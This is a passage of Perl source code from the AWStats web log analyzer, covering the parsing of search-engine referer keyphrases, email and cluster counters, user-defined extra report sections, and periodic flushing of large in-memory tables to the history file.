$LevelForKeywordsDetection ) {\n\n\t\t\t\t\t\t\t\t\t# we will complete %_keyphrases hash array\n\t\t\t\t\t\t\t\t\tmy @refurl =\n\t\t\t\t\t\t\t\t\t  split( /\\?/, $field[$pos_referer], 2 )\n\t\t\t\t\t\t\t\t\t  ; # TODO Use \\? or [$URLQuerySeparators] ?\n\t\t\t\t\t\t\t\t\tif ( $refurl[1] ) {\n\n# Extract params of referer query string (q=cache:mmm:www/zzz+aaa+bbb q=aaa+bbb/ccc key=ddd%20eee lang_en ie=UTF-8 ...)\n\t\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t\t$SearchEnginesKnownUrl{\n\t\t\t\t\t\t\t\t\t\t\t\t$tmprefererserver} )\n\t\t\t\t\t\t\t\t\t\t{  # Search engine with known URL syntax\n\t\t\t\t\t\t\t\t\t\t\tforeach my $param (\n\t\t\t\t\t\t\t\t\t\t\t\tsplit(\n\t\t\t\t\t\t\t\t\t\t\t\t\t/&/,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$KeyWordsNotSensitive\n\t\t\t\t\t\t\t\t\t\t\t\t\t? lc( $refurl[1] )\n\t\t\t\t\t\t\t\t\t\t\t\t\t: $refurl[1]\n\t\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\tif ( $param =~\ns/^$SearchEnginesKnownUrl{$tmprefererserver}//\n\t\t\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\n\t # We found good parameter\n\t # Now param is keyphrase: \"cache:mmm:www/zzz+aaa+bbb/ccc+ddd%20eee'fff,ggg\"\n\t\t\t\t\t\t\t\t\t\t\t\t\t$param =~\ns/^(cache|related):[^\\+]+//\n\t\t\t\t\t\t\t\t\t\t\t\t\t  ; # Should be useless since this is for hit on 'not pages'\n\t\t\t\t\t\t\t\t\t\t\t\t\t&ChangeWordSeparatorsIntoSpace\n\t\t\t\t\t\t\t\t\t\t\t\t\t  ($param)\n\t\t\t\t\t\t\t\t\t\t\t\t\t  ; # Change [ aaa+bbb/ccc+ddd%20eee'fff,ggg ] into [ aaa bbb/ccc ddd eee fff ggg]\n\t\t\t\t\t\t\t\t\t\t\t\t\t$param =~ s/^ +//;\n\t\t\t\t\t\t\t\t\t\t\t\t\t$param =~ s/ +$//;    # Trim\n\t\t\t\t\t\t\t\t\t\t\t\t\t$param =~ tr/ /\\+/s;\n\t\t\t\t\t\t\t\t\t\t\t\t\tif ( ( length $param ) > 0 )\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$_keyphrases{$param}++;\n\t\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\telsif (\n\t\t\t\t\t\t\t\t\t\t\t$LevelForKeywordsDetection >= 2 )\n\t\t\t\t\t\t\t\t\t\t{ # Search engine with unknown URL syntax\n\t\t\t\t\t\t\t\t\t\t\tforeach my $param (\n\t\t\t\t\t\t\t\t\t\t\t\tsplit(\n\t\t\t\t\t\t\t\t\t\t\t\t\t/&/,\n\t\t\t\t\t\t\t\t\t\t\t\t\t$KeyWordsNotSensitive\n\t\t\t\t\t\t\t\t\t\t\t\t\t? lc( $refurl[1] )\n\t\t\t\t\t\t\t\t\t\t\t\t\t: $refurl[1]\n\t\t\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\tmy $foundexcludeparam = 0;\n\t\t\t\t\t\t\t\t\t\t\t\tforeach my $paramtoexclude (\n\t\t\t\t\t\t\t\t\t\t\t\t\t@WordsToCleanSearchUrl)\n\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\tif ( $param =~\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t/$paramtoexclude/i )\n\t\t\t\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t$foundexcludeparam = 1;\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t\t\t\t\t\t} # Not the param with search criteria\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t\tif ($foundexcludeparam) {\n\t\t\t\t\t\t\t\t\t\t\t\t\tnext;\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t\t\t\t\t# We found good parameter\n\t\t\t\t\t\t\t\t\t\t\t\t$param =~ s/.*=//;\n\n\t\t\t\t\t   # Now param is keyphrase: \"aaa+bbb/ccc+ddd%20eee'fff,ggg\"\n\t\t\t\t\t\t\t\t\t\t\t\t$param =~\n\t\t\t\t\t\t\t\t\t\t\t\t  s/^(cache|related):[^\\+]+//\n\t\t\t\t\t\t\t\t\t\t\t\t  ; # Should be useless since this is for hit on 'not pages'\n\t\t\t\t\t\t\t\t\t\t\t\t&ChangeWordSeparatorsIntoSpace(\n\t\t\t\t\t\t\t\t\t\t\t\t\t$param)\n\t\t\t\t\t\t\t\t\t\t\t\t  ; # Change [ aaa+bbb/ccc+ddd%20eee'fff,ggg ] into [ aaa bbb/ccc ddd eee fff ggg ]\n\t\t\t\t\t\t\t\t\t\t\t\t$param =~ s/^ +//;\n\t\t\t\t\t\t\t\t\t\t\t\t$param =~ s/ +$//;     # Trim\n\t\t\t\t\t\t\t\t\t\t\t\t$param =~ tr/ /\\+/s;\n\t\t\t\t\t\t\t\t\t\t\t\tif ( ( length $param ) > 2 ) {\n\t\t\t\t\t\t\t\t\t\t\t\t\t$_keyphrases{$param}++;\n\t\t\t\t\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}    # End of elsif refurl[1]\n\t\t\t\t\t\t\t\t\telsif (\n\t\t\t\t\t\t\t\t\t\t$SearchEnginesWithKeysNotInQuery{\n\t\t\t\t\t\t\t\t\t\t\t$tmprefererserver} )\n\t\t\t\t\t\t\t\t\t{\n\n#\t\t\t\t\t\t\t\t\t\tdebug(\"xxx\".$refurl[0]);\n# If search engine with key inside page url like a9 (www.a9.com/searchkey1%20searchkey2)\n\t\t\t\t\t\t\t\t\t\tif ( $refurl[0] =~\n/$SearchEnginesKnownUrl{$tmprefererserver}(.*)$/\n\t\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\tmy $param = $1;\n\t\t\t\t\t\t\t\t\t\t\t&ChangeWordSeparatorsIntoSpace(\n\t\t\t\t\t\t\t\t\t\t\t\t$param);\n\t\t\t\t\t\t\t\t\t\t\t$param =~ tr/ /\\+/s;\n\t\t\t\t\t\t\t\t\t\t\tif ( ( length $param ) > 0 ) {\n\t\t\t\t\t\t\t\t\t\t\t\t$_keyphrases{$param}++;\n\t\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}    # End of if ($TmpRefererServer)\n\t\t\t\t\t\telse {\n\n\t\t\t\t\t\t  # This hit came from a site other than a search engine\n\t\t\t\t\t\t\tif ($PageBool) { $_from_p[3]++; }\n\t\t\t\t\t\t\t$_from_h[3]++;\n\n# http://www.mysite.com/ must be same referer than http://www.mysite.com but .../mypage/ differs of .../mypage\n#if ($refurl[0] =~ /^[^\\/]+\\/$/) { $field[$pos_referer] =~ s/\\/$//; }\t# Code moved in Save_History\n# TODO: lowercase the value for referer server to have refering server not case sensitive\n\t\t\t\t\t\t\tif ($URLReferrerWithQuery) {\n\t\t\t\t\t\t\t\tif ($PageBool) {\n\t\t\t\t\t\t\t\t\t$_pagesrefs_p{ $field[$pos_referer] }++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$_pagesrefs_h{ $field[$pos_referer] }++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\n\t\t\t\t\t\t\t\t# We discard query for referer\n\t\t\t\t\t\t\t\tif ( $field[$pos_referer] =~\n\t\t\t\t\t\t\t\t\t/$regreferernoquery/o )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tif ($PageBool) { $_pagesrefs_p{\"$1\"}++; }\n\t\t\t\t\t\t\t\t\t$_pagesrefs_h{\"$1\"}++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\t\tif ($PageBool) {\n\t\t\t\t\t\t\t\t\t\t$_pagesrefs_p{ $field[$pos_referer] }++;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t$_pagesrefs_h{ $field[$pos_referer] }++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$found = 1;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t\t# News Link ?\n\t\t\t\t\t#if (! $found && $refererprot =~ /^news/i) {\n\t\t\t\t\t#\t$found=1;\n\t\t\t\t\t#\tif ($PageBool) { $_from_p[5]++; }\n\t\t\t\t\t#\t$_from_h[5]++;\n\t\t\t\t\t#}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Origin not found\n\t\t\tif ( !$found ) {\n\t\t\t\tif ($ShowUnknownOrigin) {\n\t\t\t\t\tprint \"Unknown origin: $field[$pos_referer]\\n\";\n\t\t\t\t}\n\t\t\t\tif ($PageBool) { $_from_p[1]++; }\n\t\t\t\t$_from_h[1]++;\n\t\t\t}\n\n\t\t\t# Analyze: EMail\n\t\t\t#---------------\n\t\t\tif ( $pos_emails >= 0 && $field[$pos_emails] ) {\n\t\t\t\tif ( $field[$pos_emails] eq '<>' ) {\n\t\t\t\t\t$field[$pos_emails] = 'Unknown';\n\t\t\t\t}\n\t\t\t\telsif ( $field[$pos_emails] !~ /\\@/ ) {\n\t\t\t\t\t$field[$pos_emails] .= \"\\@$SiteDomain\";\n\t\t\t\t}\n\t\t\t\t$_emails_h{ lc( $field[$pos_emails] ) }\n\t\t\t\t  ++;    #Count accesses for sender email (hit)\n\t\t\t\tif ($pos_size>0){$_emails_k{ lc( $field[$pos_emails] ) } +=\n\t\t\t\t  int( $field[$pos_size] )\n\t\t\t\t  ;}      #Count accesses for sender email (kb)\n\t\t\t\t$_emails_l{ lc( $field[$pos_emails] ) } = $timerecord;\n\t\t\t}\n\t\t\tif ( $pos_emailr >= 0 && $field[$pos_emailr] ) {\n\t\t\t\tif ( $field[$pos_emailr] !~ /\\@/ ) {\n\t\t\t\t\t$field[$pos_emailr] .= \"\\@$SiteDomain\";\n\t\t\t\t}\n\t\t\t\t$_emailr_h{ lc( $field[$pos_emailr] ) }\n\t\t\t\t  ++;    #Count accesses for receiver email (hit)\n\t\t\t\tif ($pos_size>0){$_emailr_k{ lc( $field[$pos_emailr] ) } +=\n\t\t\t\t  int( $field[$pos_size] )\n\t\t\t\t  ;}      #Count accesses for receiver email (kb)\n\t\t\t\t$_emailr_l{ lc( $field[$pos_emailr] ) } = $timerecord;\n\t\t\t}\n\t\t}\n\n\t\t# Check cluster\n\t\t#--------------\n\t\tif ( $pos_cluster >= 0 ) {\n\t\t\tif ($PageBool) {\n\t\t\t\t$_cluster_p{ $field[$pos_cluster] }++;\n\t\t\t}    #Count accesses for page (page)\n\t\t\t$_cluster_h{ $field[$pos_cluster] }\n\t\t\t  ++;    #Count accesses for page (hit)\n\t\t\tif ($pos_size>0){$_cluster_k{ $field[$pos_cluster] } +=\n\t\t\t  int( $field[$pos_size] );}    #Count accesses for page (kb)\n\t\t}\n\n\t\t# Analyze: Extra\n\t\t#---------------\n\t\tforeach my $extranum ( 1 .. @ExtraName - 1 ) {\n\t\t\tif ($Debug) { debug( \"  Process extra analyze $extranum\", 4 ); }\n\n\t\t\t# Check code\n\t\t\tmy $conditionok = 0;\n\t\t\tif ( $ExtraCodeFilter[$extranum] ) {\n\t\t\t\tforeach\n\t\t\t\t  my $condnum ( 0 .. @{ $ExtraCodeFilter[$extranum] } - 1 )\n\t\t\t\t{\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check code '$field[$pos_code]' must be '$ExtraCodeFilter[$extranum][$condnum]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[$pos_code] eq\n\t\t\t\t\t\t\"$ExtraCodeFilter[$extranum][$condnum]\" )\n\t\t\t\t\t{\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !$conditionok && @{ $ExtraCodeFilter[$extranum] } ) {\n\t\t\t\t\tnext;\n\t\t\t\t}    # End for this section\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\"  No check on code or code is OK. Now we check other conditions.\",\n\t\t\t\t\t\t5\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Check conditions\n\t\t\t$conditionok = 0;\n\t\t\tforeach my $condnum ( 0 .. @{ $ExtraConditionType[$extranum] } - 1 )\n\t\t\t{\n\t\t\t\tmy $conditiontype    = $ExtraConditionType[$extranum][$condnum];\n\t\t\t\tmy $conditiontypeval =\n\t\t\t\t  $ExtraConditionTypeVal[$extranum][$condnum];\n\t\t\t\tif ( $conditiontype eq 'URL' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$urlwithnoquery'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $urlwithnoquery =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'QUERY_STRING' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$standalonequery'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $standalonequery =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'URLWITHQUERY' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$urlwithnoquery$tokenquery$standalonequery'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( \"$urlwithnoquery$tokenquery$standalonequery\" =~\n\t\t\t\t\t\t/$conditiontypeval/ )\n\t\t\t\t\t{\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'REFERER' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_referer]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[$pos_referer] =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'UA' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_agent]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[$pos_agent] =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'HOSTINLOG' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_host]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[$pos_host] =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'HOST' ) {\n\t\t\t\t\tmy $hosttouse = ( $HostResolved ? $HostResolved : $Host );\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$hosttouse'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $hosttouse =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype eq 'VHOST' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condision '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_vh]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[$pos_vh] =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $conditiontype =~ /extra(\\d+)/i ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Check condition '$conditiontype' must contain '$conditiontypeval' in '$field[$pos_extra[$1]]'\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $field[ $pos_extra[$1] ] =~ /$conditiontypeval/ ) {\n\t\t\t\t\t\t$conditionok = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\terror(\n\"Wrong value of parameter ExtraSectionCondition$extranum\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ( !$conditionok && @{ $ExtraConditionType[$extranum] } ) {\n\t\t\t\tnext;\n\t\t\t}    # End for this section\n\t\t\tif ($Debug) {\n\t\t\t\tdebug(\n\"  No condition or condition is OK. Now we extract value for first column of extra chart.\",\n\t\t\t\t\t5\n\t\t\t\t);\n\t\t\t}\n\n\t\t\t# Determine actual column value to use.\n\t\t\tmy $rowkeyval;\n\t\t\tmy $rowkeyok = 0;\n\t\t\tforeach my $rowkeynum (\n\t\t\t\t0 .. @{ $ExtraFirstColumnValuesType[$extranum] } - 1 )\n\t\t\t{\n\t\t\t\tmy $rowkeytype =\n\t\t\t\t  $ExtraFirstColumnValuesType[$extranum][$rowkeynum];\n\t\t\t\tmy $rowkeytypeval =\n\t\t\t\t  $ExtraFirstColumnValuesTypeVal[$extranum][$rowkeynum];\n\t\t\t\tif ( $rowkeytype eq 'URL' ) {\n\t\t\t\t\tif ( $urlwithnoquery =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'QUERY_STRING' ) {\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"  Extract value from '$standalonequery' with regex '$rowkeytypeval'.\",\n\t\t\t\t\t\t\t5\n\t\t\t\t\t\t);\n\t\t\t\t\t}\n\t\t\t\t\tif ( $standalonequery =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'URLWITHQUERY' ) {\n\t\t\t\t\tif ( \"$urlwithnoquery$tokenquery$standalonequery\" =~\n\t\t\t\t\t\t/$rowkeytypeval/ )\n\t\t\t\t\t{\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'REFERER' ) {\n\t\t\t\t\tif ( $field[$pos_referer] =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'UA' ) {\n\t\t\t\t\tif ( $field[$pos_agent] =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'HOSTINLOG' ) {\n\t\t\t\t\tif ( $field[$pos_host] =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'HOST' ) {\n\t\t\t\t\tmy $hosttouse = ( $HostResolved ? $HostResolved : $Host );\n\t\t\t\t\tif ( $hosttouse =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype eq 'VHOST' ) {\n\t\t\t\t\tif ( $field[$pos_vh] =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telsif ( $rowkeytype =~ /extra(\\d+)/i ) {\n\t\t\t\t\tif ( $field[ $pos_extra[$1] ] =~ /$rowkeytypeval/ ) {\n\t\t\t\t\t\t$rowkeyval = \"$1\";\n\t\t\t\t\t\t$rowkeyok  = 1;\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\terror(\n\"Wrong value of parameter ExtraSectionFirstColumnValues$extranum\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ( !$rowkeyok ) { next; }    # End for this section\n\t\t\tif ( !$rowkeyval ) { $rowkeyval = 'Failed to extract key'; }\n\t\t\tif ($Debug) { debug( \"  Key val found: $rowkeyval\", 5 ); }\n\n\t\t\t# Apply function on $rowkeyval\n\t\t\tif ( $ExtraFirstColumnFunction[$extranum] ) {\n\n\t\t\t\t# Todo call function on string $rowkeyval\n\t\t\t}\n\n\t\t\t# Here we got all values to increase counters\n\t\t\tif ( $PageBool && $ExtraStatTypes[$extranum] =~ /P/i ) {\n\t\t\t\t${ '_section_' . $extranum . '_p' }{$rowkeyval}++;\n\t\t\t}\n\t\t\t${ '_section_' . $extranum . '_h' }{$rowkeyval}++;    # Must be set\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ /B/i && $pos_size>0) {\n\t\t\t\t${ '_section_' . $extranum . '_k' }{$rowkeyval} +=\n\t\t\t\t  int( $field[$pos_size] );\n\t\t\t}\n\t\t\tif ( $ExtraStatTypes[$extranum] =~ /L/i ) {\n\t\t\t\tif ( ${ '_section_' . $extranum . '_l' }{$rowkeyval}\n\t\t\t\t\t|| 0 < $timerecord )\n\t\t\t\t{\n\t\t\t\t\t${ '_section_' . $extranum . '_l' }{$rowkeyval} =\n\t\t\t\t\t  $timerecord;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Check to avoid too large extra sections\n\t\t\tif (\n\t\t\t\tscalar keys %{ '_section_' . $extranum . '_h' } >\n\t\t\t\t$ExtraTrackedRowsLimit )\n\t\t\t{\n\t\t\t\terror(<<END_ERROR_TEXT);\nThe number of values found for extra section $extranum has grown too large.\nIn order to prevent awstats from using an excessive amount of memory, the number\nof values is currently limited to $ExtraTrackedRowsLimit. Perhaps you should consider\nrevising extract parameters for extra section $extranum. If you are certain you\nwant to track such a large data set, you can increase the limit by setting\nExtraTrackedRowsLimit in your awstats configuration file.\nEND_ERROR_TEXT\n\t\t\t}\n\t\t}\n\n# Every 20,000 approved lines after a flush, we test to clean too large hash arrays to flush data in tmp file\n\t\tif ( ++$counterforflushtest >= 20000 ) {\n\n\t\t\t#if (++$counterforflushtest >= 1) {\n\t\t\tif (   ( scalar keys %_host_u ) > ( $LIMITFLUSH << 2 )\n\t\t\t\t|| ( scalar keys %_url_p ) > $LIMITFLUSH )\n\t\t\t{\n\n# warning(\"Warning: Try to run AWStats update process more frequently to analyze smaler log files.\");\n\t\t\t\tif ( $^X =~ /activestate/i || $^X =~ /activeperl/i ) {\n\n# We don't flush if perl is activestate to avoid slowing process because of memory hole\n\t\t\t\t}\n\t\t\t\telse {\n\n\t\t\t\t\t# Clean tmp hash arrays\n\t\t\t\t\t#%TmpDNSLookup = ();\n\t\t\t\t\t%TmpOS = %TmpRefererServer = %TmpRobot = %TmpBrowser = ();\n\n\t\t\t\t\t# We flush if perl is not activestate\n\t\t\t\t\tprint \"Flush history file on disk\";\n\t\t\t\t\tif ( ( scalar keys %_host_u ) > ( $LIMITFLUSH << 2 ) ) {\n\t\t\t\t\t\tprint \" (unique hosts reach flush limit of \"\n\t\t\t\t\t\t  . ( $LIMITFLUSH << 2 ) . \")\";\n\t\t\t\t\t}\n\t\t\t\t\tif ( ( scalar keys %_url_p ) > $LIMITFLUSH ) {\n\t\t\t\t\t\tprint \" (unique url reach flush limit of \"\n\t\t\t\t\t\t  . ($LIMITFLUSH) . \")\";\n\t\t\t\t\t}\n\t\t\t\t\tprint \"\\n\";\n\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\tdebug(\n\"End of set of $counterforflushtest records: Some hash arrays are too large. We flush and clean some.\",\n\t\t\t\t\t\t\t2\n\t\t\t\t\t\t);\n\t\t\t\t\t\tprint \" _host_p:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_p )\n\t\t\t\t\t\t  . \" _host_h:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_h )\n\t\t\t\t\t\t  . \" _host_k:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_k )\n\t\t\t\t\t\t  . \" _host_l:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_l )\n\t\t\t\t\t\t  . \" _host_s:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_s )\n\t\t\t\t\t\t  . \" _host_u:\"\n\t\t\t\t\t\t  . ( scalar keys %_host_u ) . \"\\n\";\n\t\t\t\t\t\tprint \" _url_p:\"\n\t\t\t\t\t\t  . ( scalar keys %_url_p )\n\t\t\t\t\t\t  . \" _url_k:\"\n\t\t\t\t\t\t  . ( scalar keys %_url_k )\n\t\t\t\t\t\t  . \" _url_e:\"\n\t\t\t\t\t\t  . ( scalar keys %_url_e )\n\t\t\t\t\t\t  . \" _url_x:\"\n\t\t\t\t\t\t  . ( scalar keys %_url_x ) . \"\\n\";\n\t\t\t\t\t\tprint \" _waithost_e:\"\n\t\t\t\t\t\t  . ( scalar keys %_waithost_e )\n\t\t\t\t\t\t  . \" _waithost_l:\"\n\t\t\t\t\t\t  . ( scalar keys %_waithost_l )\n\t\t\t\t\t\t  . \" _waithost_s:\"\n\t\t\t\t\t\t  . ( scalar keys %_waithost_s )\n\t\t\t\t\t\t  . \" _waithost_u:\"\n\t\t\t\t\t\t  . ( scalar keys %_waithost_u ) . \"\\n\";\n\t\t\t\t\t}\n\t\t\t\t\t&Read_History_With_TmpUpdate(\n\t\t\t\t\t\t$lastprocessedyear,\n\t\t\t\t\t\t$lastprocessedmonth,\n\t\t\t\t\t\t$lastprocessedday,\n\t\t\t\t\t\t$lastprocessedhour,\n\t\t\t\t\t\t1,\n\t\t\t\t\t\t1,\n\t\t\t\t\t\t\"all\",\n\t\t\t\t\t\t( $lastlinenb + $NbOfLinesParsed ),\n\t\t\t\t\t\t$lastlineoffset,\n\t\t\t\t\t\t&CheckSum($_)\n\t\t\t\t\t);\n\t\t\t\t\t&GetDelaySinceStart(1);\n\t\t\t\t\t$NbOfLinesShowsteps = 1;\n\t\t\t\t}\n\t\t\t}\n\t\t\t$counterforflushtest = 0;\n\t\t}\n\n\t}    # End of loop for processing new record.\n\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\" _host_p:\"\n\t\t\t  . ( scalar keys %_host_p 